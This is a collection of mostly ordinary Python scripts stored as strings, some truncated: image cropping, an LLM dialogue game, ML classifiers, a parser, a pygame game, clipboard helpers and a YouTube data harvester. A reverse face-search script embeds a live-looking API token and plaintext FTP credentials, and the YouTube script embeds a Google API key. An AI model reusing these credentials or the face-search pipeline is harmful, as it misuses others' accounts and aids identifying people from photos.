    "import os\nimport subprocess\nimport time\n\ntry:\n    from PIL import Image\nexcept ImportError:\n    print(\"Pillow library not found. Installing now...\")\n    try:\n        subprocess.check_call([\"python\", \"-m\", \"pip\", \"install\", \"pillow\"])\n        from PIL import Image\n    except subprocess.CalledProcessError as e:\n        print(f\"Failed to install Pillow: {e}\")\n        exit(1)\n\ninput_image = Image.open('assets/input.png')\nskin_template = Image.open('assets/skin_template.png')\n\nif input_image.size != (72, 24):\n    raise ValueError('Input image must be 72x24 pixels')\n\nos.makedirs('assets/output', exist_ok=True)\nos.makedirs('assets/output2', exist_ok=True)\n\ncounter = 26\n\nstart_time = time.time()\n\nfor i in range(3):\n    for j in range(9):\n        if i == 0 and j == 0:\n            continue\n        block = input_image.crop((j*8, i*8, j*8+8, i*8+8))\n        \n        block.save(f'assets/output2/block_{counter}.png')\n        \n        skin = skin_template.copy()\n        skin.paste(block, (8, 8))\n        \n        skin.save(f'assets/output/skin_{counter}.png')\n        \n        counter -= 1\n\nend_time = time.time()\n\nelapsed_time = (end_time - start_time) * 1000\n\nprint(f'Done! {elapsed_time:.2f} ms')\n",
    "import sys\nimport value_evaluation\nimport llm_interface\nimport commands\nimport find_commands\n\nclass Talk:\n\n    def __init__(self, save, newsave, prompts):\n        # Main.py should call format_prompts + feed info in from there including prompts\n\n        # Values\n        self.save = save\n        self.current_prompt_index = 0\n        self.prompts = []\n        self.array = []\n        self.newsave = newsave\n\n        self.prompts = prompts\n\n        # If new game, current turn is 0\n        if newsave == True:\n            self.turn = 0\n            self.isturn1 = True\n        else:\n            self.turn = self.get_turn()\n            self.isturn1 = False\n            # Implement get turn number later\n\n        first_prompt = self.get_next_prompt()\n        self.relayprompt(first_prompt)\n\n\n        # Get LLM's conversation directions, add it to the array, and get prompts \n        LLM_start_prompt = commands.read(\"conversation_start_prompt.txt\")\n        self.array_input(\"system\",\"\",LLM_start_prompt)\n\n    def get_turn(self):\n        # implement later\n        self.isturn1 = True\n        return 0    \n\n    def array_input(self,thing,character,msg):\n            if character:\n                self.array.append({\"role\": thing, \"content\": character + \": \" + msg})\n            else:\n                self.array.append({\"role\": thing, \"content\": msg})\n\n    def get_next_prompt(self):\n        #check if there's more prompt\n        if self.current_prompt_index < len(self.prompts):\n            next_prompt = self.prompts[self.current_prompt_index] # Continue to next prompt\n            self.current_prompt_index += 1  # Move to the next prompt for the next call\n            \n            value_evaluation.main(self.array, self.save, self.current_prompt_index)\n            self.array = []\n            # This should work, but I'm rewriting a bunch of this project and am not going to test it\n            # for a little bit.\n\n            return next_prompt\n        \n        else:\n            commands.printspace(\"First turn over, second turn not implemented yet. THE END.\")\n\n            value_evaluation.main(self.array, self.save, self.turn, self.current_prompt_index)\n            # @ end of turn, run the prepare next turn script. \n            #sys.exit()\n            commands.printpure (\"Out of prompts, that's all I've got for now. If you want you can run it again with the same prompts or play around with prompts.json.\")\n\n    def relayprompt(self, prompt):\n       # Temp notation of current prompt\n        commands.printpure(self.current_prompt_index)\n\n        # Check and print enter description if available\n        if \"EnterDesc\" in prompt and prompt[\"EnterDesc\"].strip():\n            self.array_input(\"system\", \"Scene\", prompt[\"EnterDesc\"].strip())\n            commands.printpure(f\"Scene: {prompt['EnterDesc'].strip()}\")\n\n        # Check and print text1 if available\n        if \"character\" in prompt and \"text1\" in prompt and prompt[\"text1\"].strip():\n            self.array_input(\"system\", prompt[\"character\"], prompt[\"text1\"].strip())\n            commands.printpure(f\"{prompt['character']}: {prompt['text1'].strip()}\")\n\n        # Check and print text2 if available\n        if \"character\" in prompt and \"text2\" in prompt and prompt[\"text2\"].strip():\n            self.array_input(\"system\", prompt[\"character\"], prompt[\"text2\"].strip())\n            commands.printpure(f\"{prompt['character']}: {prompt['text2'].strip()}\")\n        \n        # Check and give LLM Notes if available\n        if \"notes\" in prompt and prompt[\"notes\"].strip():\n            self.array_input(\"system\", \"notes\", prompt[\"notes\"].strip())\n            # For LLM only\n\n        self.user_input(self.isturn1)\n\n    def user_input(self, first):\n        # For the first prompt it's better if it skips the LLM alltogether.\n        user_input = commands.input1()\n            \n        if first == True:\n            self.isturn1 = False\n            self.array_input(\"user\", \"player\", user_input)\n            prompt = self.get_next_prompt()\n            self.relayprompt(prompt)\n        else:\n\n            if user_input == \"exit\":  # Exit the program\n                commands.printspace(\"Are you sure you want to exit? Type yes to confirm.\")\n                confirm = commands.input1()  # Get user confirmation\n                if confirm == \"yes\":\n                    sys.exit()\n            elif user_input == \"next\":\n                # Move on to next prompt\n                self.array_input(\"user\", \"player\", \"next\")\n                prompt = self.get_next_prompt()\n                self.relayprompt(prompt)\n            else:\n                # Send message to Array and send Array to LLM for response\n                self.array_input(\"user\", \"player\", user_input)\n                self.llmresponse()\n\n    def llmresponse(self):\n        llmresponse = llm_interface.main(self.array)\n        if llmresponse:\n            # Get content from llmresponse\n            content = llmresponse.content\n            # Save what they said to conversation array\n     ",
    "import pandas as pd\nfrom sklearn.model_selection import train_test_split, GridSearchCV\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, confusion_matrix\n\ndata = pd.read_csv(\"K-Aster/data/librispeech_k.csv\")\n\nX = data[['wer', 'sim1', 'sim2']]\ny = data['membership']\n\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\nparam_grid = {\n    'penalty': ['elasticnet'],\n    'C': [0.001, 0.01, 0.1, 1, 10, 100, 1000],\n    'solver': ['saga'],\n    'l1_ratio': [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9]\n}\n\nclf = LogisticRegression(max_iter=100000)\n\ngrid_search = GridSearchCV(estimator=clf, param_grid=param_grid, cv=5, scoring='accuracy')\n\ngrid_search.fit(X_train, y_train)\n\nbest_params = grid_search.best_params_\n\nbest_clf = grid_search.best_estimator_\ny_pred = best_clf.predict(X_test)\n\naccuracy = accuracy_score(y_test, y_pred)\nprecision = precision_score(y_test, y_pred)\nrecall = recall_score(y_test, y_pred)\nf1 = f1_score(y_test, y_pred)\n\ntn, fp, fn, tp = confusion_matrix(y_test, y_pred).ravel()\nfar = fp / (fp + tn)\n\nprint(\"Accuracy:\", \"{:.3f}\".format(accuracy))\nprint(\"Precision:\", \"{:.3f}\".format(precision))\nprint(\"Recall:\", \"{:.3f}\".format(recall))\nprint(\"F1-score:\", \"{:.3f}\".format(f1))\nprint(\"False Alarm Rate (FAR):\", \"{:.3f}\".format(far))\n",
    "\"\"\" Utilities for accessing the platform's clipboard.\n\"\"\"\nimport os\nimport subprocess\n\nfrom IPython.core.error import TryNext\nimport IPython.utils.py3compat as py3compat\n\n\nclass ClipboardEmpty(ValueError):\n    pass\n\n\ndef win32_clipboard_get():\n    \"\"\" Get the current clipboard's text on Windows.\n\n    Requires Mark Hammond's pywin32 extensions.\n    \"\"\"\n    try:\n        import win32clipboard\n    except ImportError as e:\n        raise TryNext(\"Getting text from the clipboard requires the pywin32 \"\n                      \"extensions: http://sourceforge.net/projects/pywin32/\") from e\n    win32clipboard.OpenClipboard()\n    try:\n        text = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)\n    except (TypeError, win32clipboard.error):\n        try:\n            text = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)\n            text = py3compat.cast_unicode(text, py3compat.DEFAULT_ENCODING)\n        except (TypeError, win32clipboard.error) as e:\n            raise ClipboardEmpty from e\n    finally:\n        win32clipboard.CloseClipboard()\n    return text\n\n\ndef osx_clipboard_get() -> str:\n    \"\"\" Get the clipboard's text on OS X.\n    \"\"\"\n    p = subprocess.Popen(['pbpaste', '-Prefer', 'ascii'],\n        stdout=subprocess.PIPE)\n    bytes_, stderr = p.communicate()\n    # Text comes in with old Mac \\r line endings. Change them to \\n.\n    bytes_ = bytes_.replace(b'\\r', b'\\n')\n    text = py3compat.decode(bytes_)\n    return text\n\n\ndef tkinter_clipboard_get():\n    \"\"\" Get the clipboard's text using Tkinter.\n\n    This is the default on systems that are not Windows or OS X. It may\n    interfere with other UI toolkits and should be replaced with an\n    implementation that uses that toolkit.\n    \"\"\"\n    try:\n        from tkinter import Tk, TclError \n    except ImportError as e:\n        raise TryNext(\"Getting text from the clipboard on this platform requires tkinter.\") from e\n        \n    root = Tk()\n    root.withdraw()\n    try:\n        text = root.clipboard_get()\n    except TclError as e:\n        raise ClipboardEmpty from e\n    finally:\n        root.destroy()\n    text = py3compat.cast_unicode(text, py3compat.DEFAULT_ENCODING)\n    return text\n\n\ndef wayland_clipboard_get():\n    \"\"\"Get the clipboard's text under Wayland using wl-paste command.\n\n    This requires Wayland and wl-clipboard installed and running.\n    \"\"\"\n    if os.environ.get(\"XDG_SESSION_TYPE\") != \"wayland\":\n        raise TryNext(\"wayland is not detected\")\n\n    try:\n        with subprocess.Popen([\"wl-paste\"], stdout=subprocess.PIPE) as p:\n            raw, err = p.communicate()\n            if p.wait():\n                raise TryNext(err)\n    except FileNotFoundError as e:\n        raise TryNext(\n            \"Getting text from the clipboard under Wayland requires the wl-clipboard \"\n            \"extension: https://github.com/bugaevc/wl-clipboard\"\n        ) from e\n\n    if not raw:\n        raise ClipboardEmpty\n\n    try:\n        text = py3compat.decode(raw)\n    except UnicodeDecodeError as e:\n        raise ClipboardEmpty from e\n\n    return text\n",
    "# ABOUT DATASET\n# 1. pH value: PH is an important parameter in evaluating the acid\u2013base balance of water. It is also the indicator of acidic or alkaline condition of water status. WHO has recommended maximum permissible limit of pH from 6.5 to 8.5. The current investigation ranges were 6.52\u20136.83 which are in the range of WHO standards.\n# 2. Hardness: Hardness is mainly caused by calcium and magnesium salts. These salts are dissolved from geologic deposits through which water travels. The length of time water is in contact with hardness producing material helps determine how much hardness there is in raw water. Hardness was originally defined as the capacity of water to precipitate soap caused by Calcium and Magnesium.\n# 3. Solids (Total dissolved solids - TDS): Water has the ability to dissolve a wide range of inorganic and some organic minerals or salts such as potassium, calcium, sodium, bicarbonates, chlorides, magnesium, sulfates etc. These minerals produced un-wanted taste and diluted color in appearance of water. This is the important parameter for the use of water. The water with high TDS value indicates that water is highly mineralized. Desirable limit for TDS is 500 mg/l and maximum limit is 1000 mg/l which prescribed for drinking purpose.\n# 4. Chloramines: Chlorine and chloramine are the major disinfectants used in public water systems. Chloramines are most commonly formed when ammonia is added to chlorine to treat drinking water. Chlorine levels up to 4 milligrams per liter (mg/L or 4 parts per million (ppm)) are considered safe in drinking water.\n# 5. Sulfate: Sulfates are naturally occurring substances that are found in minerals, soil, and rocks. They are present in ambient air, groundwater, plants, and food. The principal commercial use of sulfate is in the chemical industry. Sulfate concentration in seawater is about 2,700 milligrams per liter (mg/L). It ranges from 3 to 30 mg/L in most freshwater supplies, although much higher concentrations (1000 mg/L) are found in some geographic locations.\n# 6. Conductivity: Pure water is not a good conductor of electric current rather\u2019s a good insulator. Increase in ions concentration enhances the electrical conductivity of water. Generally, the amount of dissolved solids in water determines the electrical conductivity. Electrical conductivity (EC) actually measures the ionic process of a solution that enables it to transmit current. According to WHO standards, EC value should not exceeded 400 \u03bcS/cm.\n# 7. Organic_carbon: Total Organic Carbon (TOC) in source waters comes from decaying natural organic matter (NOM) as well as synthetic sources. TOC is a measure of the total amount of carbon in organic compounds in pure water. According to US EPA < 2 mg/L as TOC in treated / drinking water, and < 4 mg/Lit in source water which is use for treatment.\n# 8. Trihalomethanes: THMs are chemicals which may be found in water treated with chlorine. The concentration of THMs in drinking water varies according to the level of organic material in the water, the amount of chlorine required to treat the water, and the temperature of the water that is being treated. THM levels up to 80 ppm is considered safe in drinking water.\n# 9. Turbidity: The turbidity of water depends on the quantity of solid matter present in the suspended state. It is a measure of light emitting properties of water and the test is used to indicate the quality of waste discharge with respect to colloidal matter. The mean turbidity value obtained for Wondo Genet Campus (0.98 NTU) is lower than the WHO recommended value of 5.00 NTU.\n# 10. Potability: Indicates if water is safe for human consumption where 1 means Potable and 0 means Not potable.\n#######################################################################################################################\nimport pandas as pd\nimport seaborn as sns\nfrom matplotlib import pyplot as plt\nfrom sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier, VotingClassifier, AdaBoostClassifier\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.model_selection import cross_validate, GridSearchCV\nfrom sklearn.neighbors import KNeighborsClassifier\nfrom sklearn.svm import SVC\nfrom sklearn.tree import DecisionTreeClassifier\nfrom sklearn.metrics import classification_report\nfrom sklearn.preprocessing import MinMaxScaler, LabelEncoder, StandardScaler, RobustScaler\nfrom xgboost import XGBClassifier\nfrom lightgbm import LGBMClassifier\nfrom catboost import CatBoostClassifier\n\nimport warnings\n\nfrom xgboost.testing.data import joblib\n\nwarnings.simplefilter(action=\"ignore\", category=FutureWarning)\n\npd.set_option('display.max_columns', None)\npd.set_option('display.width', 500)\n#######################################################################################################################\ndf = pd.read_csv(\"dataset/water_potability.csv\")\n####################################################################################################",
    "def first(string):\n    first_ = set()\n    if string in non_terminals:\n        alternatives = productions_dict[string]\n        for alternative in alternatives:\n            first_2 = first(alternative)\n            first_ = first_ | first_2\n    elif string in terminals:\n        first_ = {string}\n    elif string == '' or string == '#':\n        first_ = {'#'}\n    else:\n        first_2 = first(string[0])\n        if '#' in first_2:\n            i = 1\n            while '#' in first_2:\n                first_ = first_ | (first_2 - {'#'})\n                if string[i:] in terminals:\n                    first_ = first_ | {string[i:]}\n                    break\n                elif string[i:] == '':\n                    first_ = first_ | {'#'}\n                    break\n                first_2 = first(string[i:])\n                first_ = first_ | first_2 - {'#'}\n                i += 1\n        else:\n            first_ = first_ | first_2\n    return first_\n\ndef follow(nT):\n    follow_ = set()\n    prods = productions_dict.items()\n    if nT == starting_symbol:\n        follow_ = follow_ | {'$'}\n    for nt, rhs in prods:\n        for alt in rhs:\n            for char in alt:\n                if char == nT:\n                    following_str = alt[alt.index(char) + 1:]\n                    if following_str == '':\n                        if nt == nT:\n                            continue\n                        else:\n                            follow_ = follow_ | follow(nt)\n                    else:\n                        follow_2 = first(following_str)\n                        if '#' in follow_2:\n                            follow_ = follow_ | follow_2 - {'#'}\n                            follow_ = follow_ | follow(nt)\n                        else:\n                            follow_ = follow_ | follow_2\n    return follow_\n\nterminals = ['$', 'a', 'b', 'p', 'c']\nnon_terminals = ['S', 'A', 'B', 'C']\nstarting_symbol = 'S'\nproductions = ['S->A|BC', 'A->a|b', 'B->p|#', 'C->c']\n\nproductions_dict = {}\nfor nT in non_terminals:\n    productions_dict[nT] = []\nfor production in productions:\n    nonterm_to_prod = production.split(\"->\")\n    alternatives = nonterm_to_prod[1].split(\"|\")\n    for alternative in alternatives:\n        productions_dict[nonterm_to_prod[0]].append(alternative)\n\nFIRST = {}\nFOLLOW = {}\nfor non_terminal in non_terminals:\n    FIRST[non_terminal] = set()\nfor non_terminal in non_terminals:\n    FOLLOW[non_terminal] = set()\n\nfor non_terminal in non_terminals:\n    FIRST[non_terminal] = FIRST[non_terminal] | first(non_terminal)\n\nFOLLOW[starting_symbol] = FOLLOW[starting_symbol] | {'$'}\nfor non_terminal in non_terminals:\n    FOLLOW[non_terminal] = FOLLOW[non_terminal] | follow(non_terminal)\n\nprint(\"{: ^20}{: ^20}{: ^20}\".format('Non Terminals', 'First', 'Follow'))\nfor non_terminal in non_terminals:\n    print(\"{: ^20}{: ^20}{: ^20}\".format(non_terminal, str(FIRST[non_terminal]), str(FOLLOW[non_terminal])))\n\n\n\n\n\n\n\n\n\n\ndef generate_LL1_table(productions):\n    ll1_table = {}\n    for non_terminal in non_terminals:\n        ll1_table[non_terminal] = {}\n        for terminal in terminals:\n            ll1_table[non_terminal][terminal] = []\n\n    for production in productions:\n        non_terminal, production_body = production.split(\"->\")\n        production_body = production_body.split(\"|\")\n        first_set = first(production_body[0])\n        for terminal in first_set:\n            ll1_table[non_terminal][terminal].append(production_body[0])\n\n        if '#' in first_set:\n            follow_set = follow(non_terminal)\n            for terminal in follow_set:\n                ll1_table[non_terminal][terminal].append(production_body[0])\n    return ll1_table\n\nll1_table = generate_LL1_table(productions)\n\nprint(\"LL(1) Parsing Table:\")\nfor non_terminal in non_terminals:\n    print(non_terminal, ll1_table[non_terminal])\n\n\n\n\n\n\n\ndef validate_string(input_string):\n    stack = [\"$\", starting_symbol]\n    buffer = list(input_string)\n    buffer.append(\"$\")\n\n    print(\"Stack\\t\\tBuffer\\t\\tAction\")\n    print(\"-----\\t\\t------\\t\\t------\")\n\n    while True:\n        print(f\"{' '.join(stack)}\\t\\t{' '.join(buffer)}\\t\\t\", end=\"\")\n\n        top = stack[-1]\n        front = buffer[0]\n\n        if top == front == \"$\":\n            print(\"String accepted\")\n            break\n\n        elif top in terminals:\n            if top == front:\n                stack.pop()\n                buffer.pop(0)\n                print(\"Match\")\n            else:\n                print(\"String rejected\")\n                break\n\n        elif top in non_terminals:\n            if front in FIRST[top]:\n                production = productions_dict[top][0]\n                stack.pop()\n                if production != \"#\":\n                    stack.extend(list(reversed(production)))\n                print(f\"Expand using {top} -> {production}\")\n\n            elif \"#\" in FIRST[top] and buffer[0] in FOLLOW[top]:\n                stack.pop()\n                stack.append(\"#\")\n                print(f\"Expand using {top} -> #\")\n\n    ",
    "import pygame\nimport random\n\n# Initialize Pygame\npygame.init()\n\n# Set up some constants\nWIDTH, HEIGHT = 640, 480\nWHITE = (255, 255, 255)\nBLACK = (0, 0, 0)\nGRAY = (200, 200, 200)\n\n# Set up the display\nscreen = pygame.display.set_mode((WIDTH, HEIGHT))\npygame.display.set_caption(\"Jogo da adivinha\u00e7\u00e3o\")\n\n# Set up the font\nFONT = pygame.font.SysFont(\"Arial\", 24)\n\n# Set up the game state\nnumber_to_guess = random.randint(1, 100)\nguess = \"\"\nguesses = 0\nnotification = \"\"\n\n# Function to draw text on screen\ndef draw_text(text, font, color, surface, x, y):\n    textobj = font.render(text, 1, color)\n    textrect = textobj.get_rect()\n    textrect.topleft = (x, y)\n    surface.blit(textobj, textrect)\n\n# Set up the game loop\nrunning = True\nwhile running:\n    # Handle events\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n        elif event.type == pygame.KEYDOWN:\n            if event.key == pygame.K_RETURN:\n                if guess.isdigit():\n                    guesses += 1\n                    if int(guess) < number_to_guess:\n                        notification = \"O valor \u00e9 maior do que seu palpite!\"\n                    elif int(guess) > number_to_guess:\n                        notification = \"O valor \u00e9 menor do que seu palpite!\"\n                    else:\n                        notification = \"Parabens! Voc\u00ea acertou em \" + str(guesses) + \" tentativas!\"\n                        guess = \"\"\n                else:\n                    notification = \"Inv\u00e1lido!\"\n                    guess = \"\"\n            elif event.key == pygame.K_BACKSPACE:\n                guess = guess[:-1]\n            else:\n                if event.unicode.isdigit() and len(guess) < 3:\n                    guess += str(event.unicode)\n\n    # Update the screen\n    screen.fill(WHITE)\n    draw_text(\"Advinhe em que n\u00famero estou pensando em entre 1 e 100!\", FONT, BLACK, screen, 10, 10)\n    draw_text(\"Palpite: \" + guess, FONT, BLACK, screen, 10, 50)\n    draw_text(notification, FONT, BLACK, screen, 10, 90)\n\n    # Draw input box\n    pygame.draw.rect(screen, BLACK, (10, 130, 200, 40), 2)\n    pygame.draw.rect(screen, GRAY, (12, 132, 196, 36))\n\n    # Draw buttons\n    pygame.draw.rect(screen, BLACK, (250, 130, 100, 40), 2)\n    draw_text(\"Palpite\", FONT, BLACK, screen, 260, 140)\n\n    pygame.draw.rect(screen, BLACK, (370, 130, 100, 40), 2)\n    draw_text(\"Resetar\", FONT, BLACK, screen, 380, 140)\n\n    pygame.display.flip()\n\n# Quit Pygame\npygame.quit()\n",
    "\"\"\"\n====================================\nHooks factory for various behaviours\n====================================\n\n:Authors: - Florian Dupeyron <florian.dupeyron@mugcat.fr>\n:Date: April 2024\n\"\"\"\n\nimport re\nimport asyncio\n\nfrom   functools import partial\n\n###########################################\n\ndef wait_for_str_re(regex):\n   # Ensure regex is a compiled regex\n   if not isinstance(regex, re.Pattern):\n      regex = re.compile(regex)\n\n   async def wait_for_str_re_impl(task, regex):\n      task.log.info(f\"Waiting for '{task.name}' to be ready!\")\n\n      ready = False\n      queue = asyncio.Queue()\n\n      try:\n         await task.stderr_listeners.register(queue)\n         while not ready:\n            line = await queue.get()\n            if regex.search(line):\n               ready = True\n               task.set_ready()\n\n      finally:\n         await task.stderr_listeners.unregister(queue)\n   \n   return partial(wait_for_str_re_impl, regex=regex)\n\ndef wait_for_seconds(nseconds):\n   async def wait_for_seconds_impl(task, seconds):\n      task.log.info(f\"Wait for {seconds}s before considering '{task.name}' ready\")\n      await asyncio.sleep(seconds)\n      task.set_ready()\n\n   return partial(wait_for_seconds_impl, seconds=nseconds)\n",
    "import time\r\nimport requests\r\nimport argparse\r\nimport os\r\nfrom ftplib import FTP\r\n\r\n\r\n\r\nTESTING_MODE = True\r\nAPITOKEN = 'uvy/sDZy70uNXUtoWUVHGItTNSXARmI1OaA0TFOsh3a6hMtkmVi4gNQroJzpt+0HQI0pn7dZbso=' # Your API Token\r\n\r\nparser = argparse.ArgumentParser()\r\nparser.add_argument('--id', help='ID do usu\u00e1rio')\r\nargs = parser.parse_args()\r\nid_usuario = args.id\r\n#usuario = 1533706535\r\n#id_usuario = str(usuario)\r\n\r\ndef search_by_face(image_file):\r\n    if TESTING_MODE:\r\n        print('****** TESTING MODE search, results are inaccurate, and queue wait is long, but credits are NOT deducted ******')\r\n\r\n    site='https://facecheck.id'\r\n    headers = {'accept': 'application/json', 'Authorization': APITOKEN}\r\n    files = {'images': open(image_file, 'rb'), 'id_search': None}\r\n    response = requests.post(site+'/api/upload_pic', headers=headers, files=files).json()\r\n\r\n    if response['error']:\r\n        return f\"{response['error']} ({response['code']})\", None\r\n\r\n    id_search = response['id_search']\r\n    print(response['message'] + ' id_search='+id_search)\r\n    json_data = {'id_search': id_search, 'with_progress': True, 'status_only': False, 'demo': TESTING_MODE}\r\n\r\n    while True:\r\n        response = requests.post(site+'/api/search', headers=headers, json=json_data).json()\r\n        if response['error']:\r\n            return f\"{response['error']} ({response['code']})\", None\r\n        if response['output']:\r\n            return None, response['output']['items']\r\n        print(f'{response[\"message\"]} progress: {response[\"progress\"]}%')\r\n        time.sleep(1)\r\n\r\ndef search_and_print_results():\r\n    time.sleep(5)\r\n    caminho_imagem = os.path.join(id_usuario, 'imagem.jpg')\r\n    image_file = caminho_imagem \r\n    caminho_resultado = os.path.join(id_usuario, f'{id_usuario}.html')\r\n\r\n    # Pesquisar na Internet por rosto\r\n    error, urls_images = search_by_face(image_file)\r\n\r\n    if urls_images:\r\n        # Inicializar a string HTML com a estrutura b\u00e1sica do documento\r\n        html = '''\r\n        <html>\r\n        <head>\r\n            <style>\r\n                body {\r\n                    font-family: Arial, sans-serif;\r\n                }\r\n                .gallery {\r\n                    display: flex;\r\n                    flex-wrap: wrap;\r\n                    justify-content: center;\r\n                    gap: 20px;\r\n                }\r\n                .result {\r\n                    display: flex;\r\n                    flex-direction: column;\r\n                    align-items: center;\r\n                    width: 300px;\r\n                    border: 1px solid #ccc;\r\n                    padding: 10px;\r\n                    border-radius: 5px;\r\n                }\r\n                .result img {\r\n                    width: 200px;\r\n                    height: auto;\r\n                    margin-bottom: 10px;\r\n                }\r\n                .details {\r\n                    text-align: center;\r\n                }\r\n            </style>\r\n        </head>\r\n        <body>\r\n            <div class=\"gallery\">\r\n        '''\r\n\r\n        for im in urls_images:\r\n            score = im['score']\r\n            url = im['url']\r\n            image_base64 = im['base64']\r\n\r\n            # Adicionar o layout HTML para exibir as informa\u00e7\u00f5es da imagem\r\n            html += f'''\r\n            <div class=\"result\">\r\n                <a href=\"{url}\" target=\"_blank\">\r\n                    <img src=\"{image_base64}\" alt=\"Imagem encontrada\">\r\n                </a>\r\n                <div class=\"details\">\r\n                    <h3>Site:</h3>\r\n                    <p>{url}</p>\r\n                    <h3>Pontos:</h3>\r\n                    <p>{score}</p>\r\n                </div>\r\n            </div>\r\n            '''\r\n\r\n        # Fechar a estrutura do documento HTML\r\n        html += '''\r\n            </div>\r\n        </body>\r\n        </html>\r\n        '''\r\n\r\n        # Salvar o HTML como um arquivo\r\n        with open(caminho_resultado, 'w', encoding='utf-8') as file:\r\n            file.write(html)\r\n\r\n        # Upload do arquivo para o servidor FTP\r\n        ftp_host = 's1.serv00.com'\r\n        ftp_user = 'f8969_facecheck2'\r\n        ftp_password = 'Heron!23'\r\n        ftp_directory = ''\r\n\r\n        with FTP(ftp_host) as ftp:\r\n            ftp.login(ftp_user, ftp_password)\r\n            ftp.cwd(ftp_directory)\r\n            \r\n            with open(caminho_resultado, 'rb') as file:\r\n                ftp.storbinary(f'STOR {os.path.basename(caminho_resultado)}', file)\r\n\r\n        print(f\"Arquivo 'resultado.html' salvo com sucesso no servidor FTP!\")\r\n    else:\r\n        print(\"Nenhum link de imagem encontrado.\")\r\n\r\n# Verificar se o m\u00f3dulo est\u00e1 sendo executado diretamente\r\nif __name__ == \"__main__\":\r\n    search_and_print_results()",
    "from googleapiclient.discovery import build\r\nimport pymongo\r\nimport psycopg2\r\nimport pandas as pd\r\nimport streamlit as st\r\n\r\n\r\ndef api_connect():\r\n    api_id = \"AIzaSyD55if73ztupEY--Ia4TCttuBofq-sVHCg\"\r\n\r\n    api_service_name = \"youtube\"\r\n    api_version = \"v3\"\r\n\r\n    youtube = build(api_service_name,api_version,developerKey=api_id)\r\n\r\n    return youtube\r\n\r\nyoutube = api_connect()\r\n\r\n\r\ndef get_channel_info(channel_id):\r\n    request = youtube.channels().list(\r\n            part=\"snippet,contentDetails,statistics\",\r\n            id=channel_id\r\n        )\r\n    response = request.execute()\r\n    \r\n    for i in response['items']:\r\n        data = dict(channel_name=i['snippet']['title'],\r\n                    channel_id=i['id'],\r\n                    subscribers=i['statistics']['subscriberCount'],\r\n                    views=i['statistics']['viewCount'],\r\n                    total_videos=i['statistics']['videoCount'],\r\n                    channel_description=i['snippet']['description'],\r\n                    playlist_Id=i['contentDetails']['relatedPlaylists']['uploads'])\r\n        return data\r\n\r\n\r\n#get video ids\r\ndef get_videos_ids(channel_id):\r\n    video_ids=[]\r\n\r\n    response=youtube.channels().list(id=channel_id,\r\n                                    part= 'contentDetails').execute()\r\n    playlist_Id=response['items'][0]['contentDetails']['relatedPlaylists']['uploads']\r\n\r\n    next_page_token=None\r\n\r\n    while True:\r\n        response1=youtube.playlistItems().list(\r\n                                            part='snippet',\r\n                                            playlistId=playlist_Id,\r\n                                            maxResults=50,\r\n                                            pageToken=next_page_token).execute()\r\n        for i in range(len(response1['items'])):\r\n            video_ids.append(response1['items'][i]['snippet']['resourceId']['videoId'])\r\n        next_page_token=response1.get('nextPageToken')\r\n\r\n        if next_page_token is None:\r\n            break    \r\n    return video_ids    \r\n\r\n#get video information\r\ndef get_video_info(video_ids):\r\n    video_data=[]\r\n\r\n    for video_id in video_ids:\r\n        request=youtube.videos().list(\r\n            part=\"snippet,contentDetails,statistics\",\r\n            id=video_id\r\n        )\r\n        response=request.execute()\r\n\r\n        for item in response[\"items\"]:\r\n            data=dict(Channel_Name=item['snippet']['channelTitle'],\r\n                    Channel_Id=item['snippet']['channelId'],\r\n                    Video_Id=item['id'],\r\n                    Title=item['snippet']['title'],\r\n                    Tags=item['snippet'].get('tags'),\r\n                    Thumbnail=item['snippet']['thumbnails']['default']['url'],\r\n                    Description=item['snippet'].get('description'),\r\n                    Published_Date=item['snippet']['publishedAt'],\r\n                    Duration=item['contentDetails']['duration'],\r\n                    Views=item['statistics'].get('viewCount'),\r\n                    Likes=item['statistics'].get('likeCount'),\r\n                    Comments=item['statistics'].get('commentCount'),\r\n                    Favourite_Count=item['statistics']['favoriteCount'],\r\n                    Definition=item['contentDetails']['definition'],\r\n                    Caption_Status=item['contentDetails']['caption']\r\n                    )\r\n            video_data.append(data)\r\n    return video_data    \r\n\r\n#get comment information\r\ndef get_comment_info(video_ids):\r\n    Comment_data=[]\r\n    try:\r\n        for video_id in video_ids:\r\n            request=youtube.commentThreads().list(\r\n                part=\"snippet\",\r\n                videoId=video_id,\r\n                maxResults=50\r\n            )\r\n            response=request.execute()\r\n\r\n            for item in response['items']:\r\n                data=dict(Comment_id=item['snippet']['topLevelComment']['id'],\r\n                        Video_Id=item['snippet']['topLevelComment']['snippet']['videoId'],\r\n                        Comment_Text=item['snippet']['topLevelComment']['snippet']['textDisplay'],\r\n                        Comment_Author=item['snippet']['topLevelComment']['snippet']['authorDisplayName'],\r\n                        Comment_Published=item['snippet']['topLevelComment']['snippet']['publishedAt'])\r\n                \r\n                Comment_data.append(data)\r\n\r\n    except:\r\n        pass\r\n    return Comment_data\r\n\r\n\r\n#get playlist details\r\ndef get_playlist_details(channel_id):\r\n\r\n    next_page_token=None\r\n    All_data=[]\r\n    while True:\r\n            request=youtube.playlists().list(\r\n                part='snippet,contentDetails',\r\n                channelId=channel_id,\r\n                maxResults=50,\r\n                pageToken=next_page_token\r\n            )\r\n            response=request.execute()\r\n\r\n            for item in response['items']:\r\n                    data=dict(Playlist_Id=item['id'],\r\n                            Title=item['snippet']['title'],\r\n                            Channel_Id=item['snippet",
